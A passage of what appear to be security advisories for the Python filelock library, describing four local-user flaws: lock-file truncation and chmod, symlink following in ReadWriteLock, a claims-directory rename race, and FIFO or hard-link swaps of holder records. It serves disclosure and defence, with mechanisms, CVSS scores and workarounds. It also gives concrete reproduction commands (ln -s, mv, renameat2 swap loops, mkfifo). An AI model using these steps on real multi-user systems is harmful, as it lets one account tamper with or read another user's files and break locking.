`AV:L` (local): the other user needs an account on the same host. `PR:L` (low privileges): an ordinary account is enough. `UI:N` (no user interaction). `AC:L` (low attack complexity): one rename or link, then wait for the lock user's next acquire; no race. `I:H` (high integrity impact): the lock user's own process truncates a file it did not mean to touch, including content behind a second name the other user could neither modify nor delete. With a permissive explicit `mode` the other user can then write to it. If that file is one the lock user later executes or trusts, that is code execution as the lock user. `C:L` (partial confidentiality impact): the old content is gone before the other user can read anything, but what the lock user writes afterwards through a descriptor (the number the kernel gives a process for an open file) it still holds is readable. `A:N` (no availability impact). `S:U` (scope unchanged).

Classification from the review: **security, conditional** on another user controlling names in a non-sticky directory on the lock's filesystem (or on `fs.protected_hardlinks=0`). The scanner rated this high. The maintainers score it medium because the reachable targets depend on the directory layout and kernel settings described below.

## Scope and preconditions

- Lock classes: `FileLock` and `AsyncFileLock` on Unix (`UnixFileLock`). `SoftFileLock` applies an explicit mode only to a file it created with `O_CREAT | O_EXCL` and does not truncate an existing file. `WindowsFileLock` has not truncated at any version.
- The other user must put a regular file of the lock user at the lock path before the lock user's next acquire, while the lock file does not exist yet. That is the case on first use, after a reboot, after a `/tmp` cleaner, or after a release with the default `preserve_lock_file=False`, which unlinks the file. The scanner checked three ways at the scanned commit, with default kernel settings unless stated:
  - rename inside a directory without the sticky bit (a group-writable project or cache directory, a root-created `0777` directory);
  - rename from such a directory into a sticky one (`1777`) on the same filesystem. The sticky bit only protects entries that already exist, so the move succeeds while the lock path is free. Once the lock user's lock file exists there, the same move fails with `EPERM`;
  - `link(2)` into a sticky directory. This needs a system that lets a user hard-link a file it cannot write, which on Linux means `fs.protected_hardlinks=0`. Mainstream distributions set 1, which refuses the link. The scanner did not test macOS or the BSDs.
- What the lock user loses: with the default `FileLock(path)` the lock truncates the file, which keeps its mode. With an explicit `mode` (a lock shared between users needs `0o666` or `0o660`, because `UnixFileLock` opens the file read-write), the lock also chmods the file to that mode. `_apply_explicit_mode` suppresses `PermissionError` only for files the lock user does not own. The lock user owns its own files, so the `fchmod` succeeds.
- Trust boundary: the protection against another local user holds only when no other user can rename entries in the lock's directory or, for the rename-into-sticky route, in any directory on the same filesystem that holds a file of the lock user. A user who can rename entries in a non-sticky directory above the lock controls every name below it, which no file-based lock can defend against.
- Not affected: a symlink (a file that points at another path) at the lock path, because `O_NOFOLLOW` makes the open fail with `ELOOP`; mutual exclusion between cooperating processes.

## Affected code

Scanned commit `b831496b0273`: [`UnixFileLock._finalize_locked_fd`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_unix.py#L144-L163), whose [`os.ftruncate` and `_apply_explicit_mode` calls](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_unix.py#L150-L154) have only the `st_nlink != 0` guard (the file still has at least one name); [`_apply_explicit_mode`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_unix.py#L165-L168); [`_open_lock_file`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_unix.py#L95-L121), which learns from its `O_EXCL` create whether this attempt made the file but hands that flag only to the `ENOSYS` fallback.

## Introduced

The truncation of whatever is at the lock path dates from the initial commit ([2157efb](https://github.com/tox-dev/filelock/commit/2157efb8b57666699fcf15bf03c3771c1571279c), which opened with `O_TRUNC`). The chmod of a pre-existing inode (the kernel's identity for a file, independent of its name) came with [d7e1e84](https://github.com/tox-dev/filelock/commit/d7e1e84e71ad) "changed from os.umask to os.chmod" ([#206](https://github.com/tox-dev/filelock/pull/206), 2023-03-22), first tag 3.10.2 (verified with `git tag --contains`). Before it the code passed the mode only to `open()`, which applies it to a file this call creates. The advisory range is therefore every release up to 4.2.0. The earlier group range `>= 3.10.0` understated it, as the review noted.

## Mechanism

`_open_lock_file` first tries `os.open(path, O_RDWR | O_NOFOLLOW | O_CREAT | O_EXCL, mode)`. With the lock user's file renamed to the lock path that fails with `FileExistsError`. The second `os.open(path, O_RDWR | O_NOFOLLOW)` succeeds, because the entry is a regular file the lock user owns, and returns `created = False`. `_acquire_native` passes `created` only to the `ENOSYS` branch. No process holds a `flock` on the renamed file, so `_lock_fd_nonblocking(fd)` succeeds at once and `_finalize_locked_fd(fd)` runs: `os.fstat`, `st_nlink != 0`, `os.ftruncate(fd, 0)`, then `os.fchmod(fd, mode)` when the lock has an explicit mode. Nothing in that path tells a lock file from any other regular file; a link count of 2 and a non-empty file both pass. `O_NOFOLLOW` does not help because the entry is the file itself (or a hard link, an ordinary directory entry for the same inode), not a symlink to it. There is no race: the other user renames or links once and waits for the next acquire. `AsyncUnixFileLock` inherits `_finalize_locked_fd` unchanged.

The scanner measured three variants at the same commit, same accounts (`victim` uid 1000, `attacker` uid 1001). First, a rename within a `0777` directory: the next `FileLock("jobs.lock", mode=0o666)` of `victim` empties the `0600` journal of `victim` renamed to `jobs.lock` and sets it to `0666`; `attacker` then reads what `victim` keeps writing through its open descriptor. Second, a rename of a two-name file (`ln /tmp/cache/blob ~/env/blob`, `0644`) from a `0777` directory, `fs.protected_hardlinks=1`: after `mv /tmp/cache/blob /tmp/cache/app.lock` and `FileLock("/tmp/cache/app.lock", mode=0o666)` as `victim`, `~/env/blob` has `2 links, mode 666, 0 bytes` and `echo pwned >> /home/victim/env/blob` as `attacker` succeeds, in a directory `attacker` cannot write. Third, `os.link(notes, lock_path)` in a `1777` directory with `fs.protected_hardlinks=0`: `notes.txt` (`0644`, in the home of `victim`) ends up 0 bytes with mode `0666`, and `open(notes, "w")` as `attacker` then succeeds. With plain `FileLock(lock_path)` a `0600` file ends up empty with its mode unchanged. The planted name stays after release, so every later acquire truncates the file again.

## Evidence

The scanner reproducer (`victim` and `attacker` accounts, root-created `0777` directory without the sticky bit under `/tmp`, default sysctls, Linux 6.1, CPython 3.14.8, overlayfs; lock `FileLock(path, mode=0o666, timeout=5)`). It printed `CONTROL journal: inode 296383, uid 1000, mode 600, content 'ran job 1\n'` and `CONTROL attacker reads the journal: 'permission denied\n'`. After the rename and the second job of `victim` it printed `OBSERVED lock path: inode 296383, uid 1000, mode 666, content 'ran job 2 f4bc9a4e04c3f556\n'` and `OBSERVED attacker reads the lock path: 'ran job 2 f4bc9a4e04c3f556\n'`, last line `BUG`. The verdict requires that the earlier read by `attacker` failed, that the lock path is the journal's inode, that the old line is gone, that the mode went from `0600` to `0666`, and that the later read by `attacker` contains the secret. It runs in under a second with no race. The scanner ran the two-name and `link(2)` variants above by hand at the same commit (commands and results in its report), not through the script.

Maintainer triage: the reproducer prints `BUG` on the scanned commit `b831496` and on the 4.2.0 release image. The independent review (`soft-open`) confirmed the mechanism and that the hard-link and two-name variants go through the same two calls.

## Impact

The file's content is lost in every configuration, including for processes that hold the file open and under every other name the file has. With an explicit permissive `mode`, the other user can read and modify everything the lock user writes afterwards, while the file still belongs to the lock user. The other user can rename the file back to its old name after the acquire. It stays there with the lock's mode, and the lock user's next acquire creates a fresh lock file.

Somebody who may rename a single-name file may also unlink it, so losing such a file under its name is not new. What the lock adds are two operations on the inode that the other user cannot perform, `ftruncate` and `fchmod`, run with the lock user's privileges. Those matter for a descriptor the lock user still holds, for a second name of the file, and for programs that trust the file's ownership. The other user does not choose the mode, and the lock user writes no bytes the other user chose. Mutual exclusion is not affected.

## Workarounds

- Keep the lock file in a directory no other account can write, or in a sticky directory on a filesystem where no directory holding the lock user's files is writable by others. On Linux keep `fs.protected_hardlinks=1` (the default on mainstream distributions), which closes the hard-link route.
- Do not pass a permissive explicit `mode` (`0o666`, `0o660`, `0o644`) unless accounts share the lock; without a mode the exposure is the truncation only.
- Keep the lock file in place (`preserve_lock_file=True`). Once a lock file owned by the lock user exists in a sticky directory, another user cannot rename or link over it.
- Where the lock does not need `flock` semantics, `SoftFileLock` applies its mode only to the marker it created with `O_EXCL` and does not truncate an existing file.

cwe.name: Use of Incorrectly-Resolved Name or Reference

cves.summary:
### Summary

`ReadWriteLock` and `AsyncReadWriteLock` resolve the lock path with `pathlib.Path.resolve()` and pass it to `sqlite3.connect()` without refusing a symlink. A local user who can create names in the lock's directory, such as `/tmp` or a shared cache, can plant a symlink at the lock path and make the victim's process create, lock, or write the file it points to, or break mutual exclusion between the victim's own processes.

### Details

`ReadWriteLock.__init__` stores `pathlib.Path(lock_file).resolve()`, which follows a final symlink, and every connection opens that path through `sqlite3.connect()` with no `O_NOFOLLOW` or regular-file check. SQLite's own VFS also resolves the final symlink in user space, so `fs.protected_symlinks` and the sticky bit do not help: the kernel never sees a symlink to refuse. The other lock classes do not follow a final symlink: `FileLock` opens with `O_NOFOLLOW`, and `SoftReadWriteLock` coordinates through `<path>.rw/`.

### Proof of concept

On Linux, with the victim and attacker as different users and `/shared` mode 1777 with `fs.protected_symlinks=1`:

1. The attacker runs `ln -s /home/victim/private/pwned.flag /shared/app.rwlock.db`.
2. The victim constructs `ReadWriteLock("/shared/app.rwlock.db")`. A plain `os.open(..., O_NOFOLLOW)` on the same path fails, but the lock creates `/home/victim/private/pwned.flag`, owned by the victim, inside a directory the attacker cannot write.
3. With `/shared/cache.rwlock.db -> /shared/a.db`, one victim process holds the write lock. The attacker repoints the link to `/shared/b.db`, and a second victim process acquires the write lock while the first still holds it.

The same behavior reproduces on macOS, on Windows 11, and through `AsyncReadWriteLock`.

### Impact

A local attacker with write access to the lock directory can make the victim create empty files it owns at paths the attacker cannot write, make the victim hold a SQLite lock on another application's database so that application gets `database is locked`, and give two victim processes the write lock at once, letting them corrupt the resource the lock protects.

### Workarounds

Keep `ReadWriteLock` paths in directories that only trusted users can write.

cwe.name: Improper Link Resolution Before File Access ('Link Following')

cves.summary:
`StrictSoftFileLock` and `AsyncStrictSoftFileLock` check `<path>.filelock` (the coordination directory that holds the lock's state) with one `lstat` call on its name. `lstat` reports what a name is without following a symbolic link (a file that redirects to another path). After that check, the code reaches `<path>.filelock/claims` by pathname for every later operation (`mkdir`, scan, publish, link, unlink). `_open_directory` passes `O_NOFOLLOW` (a flag that makes an open fail when the final name is a symbolic link), but the flag covers only the final `claims` component. The kernel follows a symbolic link in any earlier component.

Another local user (the other user below) who can rename `<path>.filelock` exchanges it for a symbolic link after the check. In a shared directory without the sticky bit (a directory flag that lets only a file's owner rename or remove it), any user with write access can do this. Where the shared directory is sticky, such as `/tmp`, only the user who created `<path>.filelock` before the user running the lock (the lock user below) first used it can. The lock user's process (root's, if root takes the lock) then creates a `claims` directory and claim files (the files whose presence says a process wants or holds the lock) inside a directory the other user chooses but only the lock user can write.

When the link points at another strict lock's `.filelock` directory, the stranded claims make that lock time out for every process until an operator finds and force-breaks each one. The `claims` property and `force_break()` resolve the same path with no check at all. Affected versions: filelock >= 3.30.0 and <= 4.2.0 (finding `ANT-2026-SVFEYX89`).

## Severity

**CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:H, 5.8 (Medium).**

`AV:L` (local): the other user needs an account on the same host. `AC:H` (high attack complexity): the swap must land between the `lstat` and the next `mkdir`. The other user does not aim at that window. It flips the name in a loop with `renameat2(RENAME_EXCHANGE)` (a system call that swaps two names in one step) across repeated acquires, and won after 1 to 31 runs of the lock user's program in the scanner's trials. A sticky directory also requires it to have created `<path>.filelock` first. `PR:L` (low privileges): an unprivileged account is enough. `UI:N` (no user interaction): the lock user's process acts on its own.

`C:L` (low confidentiality impact): through `claims`, one file name per planted link from a directory only the lock user can list. `I:L` (low integrity impact): a directory named `claims` and files with filelock's fixed claim names and contents appear, created with the lock user's privileges, in a directory the other user chooses but cannot write. The process overwrites or truncates nothing that exists. `A:H` (high availability impact): aimed at another strict lock of the lock user, the stranded claims deny that lock to every process until an operator finds and force-breaks each one. Classification from the review: security, conditional on the other user being able to rename the intermediate component. The scanner rated it high (CWE-363).

## Scope and preconditions

- The other user can rename `<path>.filelock`. In a writable directory without the sticky bit (a `0777` or group-writable project or cache directory), any user with write permission on the directory can, even though the lock user created and owns `<path>.filelock`. In a sticky directory such as `/tmp`, only the user who created `<path>.filelock` before the lock user's first use can, because that user then owns both the directory and the symbolic link (the planting precondition of GHSA-9c4x-gm8v-wgc4).
- The link's target is a directory the lock user can write. The effect that matters is on that directory. An acquire that completes through the link also holds the shared lock with its claims elsewhere, but a user who can rename `<path>.filelock` can defeat that lock's exclusion anyway.
- `fs.protected_symlinks=1` (a Linux setting that refuses to follow another user's symbolic link in a world-writable sticky directory) does not interfere. The link is an intermediate path component, not the last one. In the sticky-directory case it also sits in a directory the other user owns.
- Missed attempts show up to the lock user as `SoftFileLockProtocolError` or `FileNotFoundError`. The swap therefore works against a lock that a program takes more than once: a periodic job, a worker pool, or a caller that retries or waits with a timeout (each poll of a waiting acquisition is a new attempt).
- The two entry points that need no race (`claims` and `force_break()` on a resting symbolic link) depend on the lock user inspecting or recovering the lock. The planted link invites this by making `acquire()` fail with a protocol error. The `force_break()` variant works only when the lock user breaks claims that name a live process on its own host without checking them first, as the recovery loop in `docs/tutorials.rst` does. `docs/how-to.rst` tells the operator to verify that the named owner is gone before breaking.
- Platform: POSIX, demonstrated on Linux (tmpfs and overlayfs). Windows has no `dir_fd` (file operations relative to an open directory handle), and on Windows the documented requirement is a lock directory that untrusted users cannot write.

filelock's checks against another local user hold only when no other user can replace the lock's directory or any of its ancestors. That is the case when each ancestor belongs to the lock user or root and is either not writable by others or sticky. A user who can rename entries in a non-sticky directory above the lock controls every name below it. No file-based lock can defend against that.

## Affected code

At the scanned commit b831496, the check and the first use are adjacent lines of [`StrictSoftFileLock._acquire`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_strict.py#L123-L128). [`_open_directory`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_strict.py#L950-L954) passes `O_DIRECTORY | O_NOFOLLOW` but receives the full `<path>.filelock/claims`. The claim scan goes by pathname in [`_read_existing_claims`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_strict.py#L509-L514) (`directory.exists()`) and [`_list_claim_names`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_strict.py#L433-L439) (`os.scandir(directory)`). So do [`_publish_record`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_strict.py#L572-L596), [`_link_no_replace`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_strict.py#L864-L881), [`_unlink_in_directory`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_strict.py#L912-L939) and the clock probe in [`_filesystem_now`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_strict.py#L745-L763). The [`claims` property](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_strict.py#L235-L239) and [`force_break()`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_strict.py#L260-L267) take the directory from [`_claim_directory`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_strict.py#L314-L318) by string concatenation, and [`_require_exact_name`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_strict.py#L1016-L1019) confirms the name with a by-name `os.scandir`.

## Introduced

The by-name claim directory came with 650c17c79c54 ("feat(strict): replace shared markers with owner claims", #659, 2026-07-14), first released in 3.30.0. One effect is newer. The clock-probe files that a swap at `claims` leaves behind need `_filesystem_now`, added in 508d0548538f ("fix(strict): age private records by the filesystem clock", #792, 2026-10-07), first released in 4.1.0. Before that commit a claim scan created nothing. We checked both against the git tags.

## Mechanism

On the benign path, `_ensure_protocol_directory(coordination_directory)` finds `<path>.filelock` to be a real directory, and `_ensure_protocol_directory(claim_directory)` finds `claims` inside it. The doorway (the acquire step that scans existing claims and publishes the caller's own) then publishes into it. A symbolic link resting at `<path>.filelock` stops at the first call with "is not a real directory". That answer describes the name at that instant only; nothing carries it forward. With the name exchanged for a link to a directory `T` between the two calls:

- The second call runs `mkdir("<path>.filelock/claims")`, which creates `T/claims` with the lock user's credentials. The `mkdir` succeeds, so `_ensure_protocol_directory` returns without looking at anything.
- `_attempt_doorway` then works in `T/claims` for as long as the name still points there. `_read_existing_claims` uses `directory.exists()` and `os.scandir(directory)`. `_publish_record` opens the claim directory by its full path and creates `.intent-v1-<token>.claim.private-v1-<hex>.tmp` and `intent-v1-<token>.claim` (the intent claim, which announces a pending acquire) in it. When its intent wins the scan, `_link_no_replace` adds `held-v1-<token>.claim` (the held claim, which marks the lock as taken). `_open_directory` does pass `O_DIRECTORY | O_NOFOLLOW`, but on `"<path>.filelock/claims"`, so the flag covers `claims` only.
- Cleanup resolves the name again. `_unlink_in_directory` opens `<path>.filelock/claims` by path. When the name is back at the real directory by then, the `unlink` gets `ENOENT` (the "no such file" error), which `_unlink_owner_path_result` counts as removed. The claim file stays in `T/claims`.

When `T/claims` already exists, the `mkdir` takes the `FileExistsError` branch, `lstat` sees a real directory, and the same scan and publication run on the existing directory. With `T/claims` holding a file `secret-name.txt` and an old `.held-v1-<hex>.claim.private-v1-<hex>.tmp`, the lock user's process raises `SoftFileLockProtocolError: … claim 'secret-name.txt': unknown claim name or protocol version`. `_reclaim_private_record` unlinks the private-record file. `intent-*.claim` files and a clock-probe file from `_filesystem_now` stay behind.

The window is a few lines of Python between two system calls, but the other user does not aim at it. `renameat2` with `RENAME_EXCHANGE` flips the name in a loop, so each system call of the lock user sees the directory or the link more or less at random. An attempt that sees the link at the `lstat` raises `SoftFileLockProtocolError`. One that sees the directory there and the link at the next `mkdir` is a hit. Four other ways reach the same by-name resolution. The scanner observed each of them at the same commit, with `victim` and `attacker` as separate accounts and default lock options.

The first way strands claims in another strict lock. With the swapped-in link pointing at the coordination directory of a second lock of the lock user (`/home/victim/private/db.lock.filelock`, parent mode `0700`), 200 acquires of the shared lock left 7 to 17 well-formed `intent-v1-*.claim` and `held-v1-*.claim` files in the second lock's `claims`. No process holds that lock, yet `StrictSoftFileLock("/home/victim/private/db.lock", timeout=1)` raises `Timeout` from then on, until an operator force-breaks each stranded claim.

The second way swaps one component lower, at `claims`. The claim scan does not use a descriptor (an open handle that stays bound to one directory whatever its name later points to). `os.scandir(directory)`, the record reads, `_reclaim_private_record` (called with its descriptor slot set to `None`) and the clock probe in `_filesystem_now` (`os.open(directory / name, O_CREAT | O_EXCL | O_NOFOLLOW)` followed by `probe.unlink()`) all go by pathname. For a sticky directory, the other user needs to have created `<path>.filelock` first. It then puts a real `claims` directory (mode `1777`) in it with one empty file named `.held-v1-<32 zeros>.claim.private-v1-<32 zeros>.tmp`, so that every scan calls the probe, and exchanges `claims` with a link in a loop.

After 200 acquires by the lock user, 14 to 42 one-byte, mode `0600`, lock-user-owned files named `.held-v1-<hex>.claim.private-v1-<hex>.tmp` are in the `0700` directory the link points to. The probe open went through the link, and the pathname `unlink` ran after `claims` was a directory again and got `ENOENT`. A swap at this level does not affect publication or release, because there `_open_directory`'s `O_NOFOLLOW` does cover `claims`.

The third way is `claims` with no race. The property calls `_read_existing_claims` on an instance that did not go through `_acquire`, and `directory.exists()` and `os.scandir(directory)` both follow a link. After the other user runs `mkdir /tmp/work.lock.filelock; ln -s /home/victim/private /tmp/work.lock.filelock/claims`, `acquire()` refuses with "is not a real directory". The inspection loop from `docs/how-to.rst` (`for claim in lock.claims: ...`) raises `SoftFileLockProtocolError: … claim 'customer-1123f274.db': unknown claim name or protocol version`. That names the first non-hidden entry, in sort order, of a directory the other user cannot list. A missing or empty target returns `()`, a non-directory gives "Not a directory" and an unreadable directory "Permission denied", so the call also tells those apart.

The fourth way is `force_break()` with no race. It confirms the name with a by-name `os.scandir` in `_require_exact_name` and unlinks through `_unlink_in_directory`, where `O_NOFOLLOW` again covers `claims` only. After the other user's one command `ln -s /home/victim/private/db.lock.filelock /tmp/service.lock.filelock`, the recovery loop from `docs/tutorials.rst` run by the lock user on `/tmp/service.lock` (`for claim in stale.claims: stale.force_break(claim.name)`) lists and removes the `held` and `intent` claims of the live holder of `/home/victim/private/db.lock`. A second process then acquires that lock while the first is still in its critical section with `is_locked == True`. The first holder's `release()` later finds its claims gone, counts `ENOENT` as removed and returns without error. Only a directory named `claims` below the link's target is reachable, so the targets are other strict locks, not arbitrary files.

## Evidence

The scanner's reproducer (commit b831496, Linux 6.1 x86_64, CPython 3.14, `fs.protected_symlinks=1`) creates `/dev/shm/filelock-repro-shared` (`0777`, no sticky bit) and `/tmp/filelock-repro-private` (`0700`, owned by `victim`). Three controls run first. The other account's own `mkdir` in the private directory answers `Permission denied`. A link resting at `static.lock.filelock` gives `job skipped: SoftFileLockProtocolError` with the private directory holding `[]`. An undisturbed job prints `job ran` and leaves `work.lock.filelock` as `drwxr-xr-x`, owner uid 1000.

Then the swap loop starts and the job (`with StrictSoftFileLock(path, timeout=1)`) runs up to 200 times until the private directory is no longer empty. That took 1 to 8 runs, about 1.5 s in total. Afterwards `claims`, a directory owned by uid 1000 and mode `0755`, is in the private directory; in some runs it holds `intent-v1-<token>.claim` and `held-v1-<token>.claim` files. Verdict `BUG`. In a `1777` directory on tmpfs (a memory-backed filesystem), with the other account having created `<path>.filelock` first, the lock user created `T/claims` after 4, 22 and 2 runs in three trials. The scanner ran the four further cases under Mechanism in separate runs with the same accounts.

Our review ran the reproducer against the 4.2.0 release image and the scanned commit (`BUG` on both) and against the head of #839 (`OK`: all 200 runs completed with the private directory empty). The review's regression tests on POSIX cover the `claims`-level swap and the `force_break()` case. We did not verify Windows.

## Impact

Another local user who can rename `<path>.filelock` makes the lock user's process create a directory named `claims`, mode `0777 & ~umask` (umask: the process's default permission mask), inside any directory that process can write, and leave claim files in it. The other user chooses the location only. filelock fixes the directory name, and the files contain filelock's own claim record (magic, token, PID, host name, start token). The process overwrites or truncates nothing that exists. This amounts to directory and file creation outside the lock's directory with the lock user's privileges, not a write of chosen data.

Where the chosen directory already has a `claims` subdirectory, the lock user's process also scans it, unlinks entries named like stale private records, and raises an error that quotes the first other file name in it. Aimed at another strict lock's `.filelock` directory, the stranded claims deny that lock to every process until an operator finds and `force_break()`s each one. Without this the other user has no way to affect a lock in a directory it cannot enter. The swap at `claims` leaves one-byte `0600` dot-files instead of claims.

Through `claims`, another user learns one file name per planted link from a directory only the lock user can list, and whether a guessed path is missing or empty, a file or a directory. This needs the exception text or its `claim_name` to reach that user (a shared log, CI output, an error report); on its own this disclosure is minor. The `force_break()` variant puts two processes inside a different strict lock's critical section, one the other user can neither list nor write, with neither told. That happens only when the lock user runs the tutorial's blind recovery loop.

This shares only the bug class with GHSA-j8f7-rjxc-mr56 (the symbolic link at the `ReadWriteLock` database path, fixed in 4.0.9). There the other user chose the file the lock opened. Here the link sits one component above the final one, the other user swaps it in after the check that refuses it, and it chooses only the parent directory.

## Workarounds

Keep strict locks in a directory no other user can write. In a sticky shared directory, create `<path>.filelock` as the service user before any other account can, and check its owner before first use. Do not run the recovery loop from `docs/tutorials.rst` on a lock in a shared directory without first verifying, as `docs/how-to.rst` says, that the owner named in each claim is gone. Treat an unexpected `SoftFileLockProtocolError` that quotes an unknown claim name as a sign that `claims` may point elsewhere. Keep the exception text of `claims` out of logs other accounts can read. On Windows, keep the lock directory writable only by trusted users.

cwe.name: Race Condition Enabling Link Following

cves.summary:
`SoftReadWriteLock` (and `AsyncSoftReadWriteLock`, which wraps one) refreshes its holder record (the file under `<path>.rw/holders/` that says a process holds or wants the lock) on every poll of a waiting acquire and on every heartbeat (the periodic refresh a holder runs to keep its record fresh). It does so by reopening `<path>.rw/holders/<token>` by name with a plain blocking `O_WRONLY | O_NOFOLLOW` open and writing at offset 0, without checking what it opened. `O_NOFOLLOW` makes the open fail only when the final name is a symbolic link (a file that redirects to another path).

A different local user (the other user below) who owns the lock's `.rw` tree reads the token of the user running the lock (the lock user below) from the `holders/` listing and renames another node over the record. The other user owns the tree because it created it first in a sticky directory such as `/tmp` (the sticky bit is a directory flag that lets only a file's owner rename or remove it), or because it can write a lock directory without the sticky bit.

A FIFO (a named pipe: a file whose open for writing blocks until some process opens it for reading) makes the lock user's `write_lock()` / `read_lock()` hang regardless of `timeout`. It also stops a lock holder's heartbeat thread without `on_compromise` (the callback that tells a holder it lost the lock) ever running, so the lock grants a second process while the first still believes it holds it. This works on a default Linux.

Where the kernel lets a user hard-link a file it does not own (a hard link is a second name for the same file; Linux with `fs.protected_hardlinks=0`; macOS and the BSDs by their defaults, not executed), a hard link makes the lock user overwrite the first ~135 bytes of one of its own private files with its holder record. Affected versions: filelock >= 4.0.0 and <= 4.2.0. Anthropic's OSS Scanner reported it in private as `ANT-2026-AT33VEVC` [medium, CWE-62], titled "SoftReadWriteLock holder refresh writes through hard links, hangs on FIFOs".

## Severity

**CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:H, 6.1 (Medium).**

`AV:L` (local): the other user needs an account on the same host. `AC:L` (low attack complexity): on a default Linux there is no race. `PR:L` (low privileges): a local user with ordinary privileges is enough. `UI:N` (no user interaction): the lock user's process acts on its own. `C:N` (no confidentiality impact): the other user learns nothing. `I:L` (low integrity impact): where the kernel permits hard links to files one does not own, the lock user also writes its holder record over the first ~135 bytes of one of its private files. The bytes are filelock's record, not chosen by the other user, so the change stays within that record. `A:H` (high availability impact): the other user makes a lock user's acquire outlast any `timeout` and leaves a holder's heartbeat thread asleep. The lock then evicts the holder without telling it, and two processes believe they hold the write lock.

Classification from the external review: conditional security. The owner of a planted `.rw` tree can make the refresh open a FIFO and stall a lock user, including its heartbeat. Overwriting a file of the lock user through a hard link also needs a permissive hard-link policy. The scanner rated it medium.

## Scope and preconditions

- Trust boundary: the other party is a different local account that owns the lock's `.rw` tree. Either it created `<path>.rw` (with `gen/` and `holders/`) before the lock's first use in a sticky directory such as `/tmp`, where `prepare()` adopts an existing tree whoever owns it and whatever its mode. Or the lock lives in a directory without the sticky bit that the account can write (the scanner checked a root-created `0777` directory). There being first is not needed, because the other user renames the lock user's own `0700` tree aside and puts its own in place; `prepare()` does not run again for a live lock object, and a waiting lock user recreates its record in the replacement. A tree the lock user already created in a sticky directory (mode `0700`) is out of reach.
- FIFO variant: needs only that boundary. It works on a default Linux. `fs.protected_hardlinks` plays no part, and `fs.protected_fifos=1` (a Linux setting that refuses some opens of FIFOs in sticky world-writable directories) does not help, since it covers `O_CREAT` opens in sticky directories only, and the other user renames the FIFO into place inside its own `holders/`.
- Hard-link variant: also needs a kernel that permits a hard link to a file the caller does not own. That is Linux with `fs.protected_hardlinks=0` (the kernel's built-in value; observed), while most distributions and the scanner's test image boot with `1`, under which the other user's `link()` fails with `EPERM` (operation not permitted) and the file stays untouched. macOS and the BSDs have no such restriction by default; that follows from their `link(2)` semantics, and the scanner did not execute it. The target must be a regular file the lock user may write, on the same filesystem as the lock, in a directory the other user can search. A `0600` file in a `0755` home directory qualifies; a file under a `0700` directory does not.
- Platform: observed on Linux 6.1. `AsyncSoftReadWriteLock` runs the same code through an executor thread and loses that thread (from the code, not run). On Windows named pipes cannot live in a regular directory, so there is no FIFO case there.
- Ancestor boundary: protection against another local user is possible only while no other user can replace the lock's directory or any of its ancestors. That is the case when each ancestor belongs to the lock user or root and is either not writable by others or sticky.

The unguarded reopen came with `f974328` ("fix(soft-rw): replace the state mutex with a generation log (#738)", 2026-09-17), which dropped the earlier marker code's check of the opened descriptor. It was first released in 4.0.0 (verified with `git tag --contains f974328`, which answers 4.0.0).

## Mechanism

`OsFiles.overwrite()` refreshes a holder record by opening `holders/<token>` by name and writing at offset 0. `O_NOFOLLOW` refuses a symbolic link at that name (a planted one ends the acquire with `OSError: [Errno 40]` and the target untouched). A hard link is an ordinary directory entry, and a FIFO is not a symbolic link either. Nothing between the open and the write checks that the descriptor is the file `create()` made. Another user who can rename inside `holders/` has two ways to use the one unguarded reopen, depending on the node it puts under the lock user's record name:

1. The other user can write `holders/`. `prepare()` uses an existing protocol tree whoever owns it; it checks only the node type. In sticky `/tmp`, the user who creates `/tmp/app.lock.rw/{gen,holders}` before the lock's first use owns `holders/` and may rename over anything the lock user creates in it. In a shared directory without the sticky bit, being first is not needed.
2. The lock user publishes its record and drops the descriptor. `Participant.publish()` calls `OsFiles.create()`, which opens `holders/<token>` with `O_CREAT | O_EXCL`, writes the record and closes. The token is the file name, so the other user reads it from a listing of its own directory.
3. The other user swaps the name. Hard link: `link("/home/victim/accounts.csv", "holders/link")`, then `rename("holders/link", "holders/<token>")`; `link(2)` needs search permission on `/home/victim` and write permission on `holders/`, nothing on the file. FIFO: `mkfifo` (mode `0666`) + `rename`, so the name is absent at no point and the lock user does not take the "record is gone, recreate it" branch.
4. The lock user writes by name. Each poll of a waiting acquire (`poll_interval`, 0.25 s) runs `advance()` → `_keep_claim_fresh()` → `_refresh_nonce()` → `overwrite()`. With the hard link the lock user owns the linked file, so `O_WRONLY` succeeds and `write_all` puts `encode_holder(...)` at offset 0 without truncating. The lock user's call then ends in an ordinary `Timeout`. A granted holder does the same from its heartbeat thread every `heartbeat_interval` (30 s by default). With `heartbeat_interval=0.5`, the holder also writes through a link planted one second after it got the write lock, and `lock.compromise` stays `None`.
5. The link disappears. On `Timeout` or release, `leave()` unlinks `holders/<token>`, which is now the other user's link. The target is back to one link and `holders/` is empty.

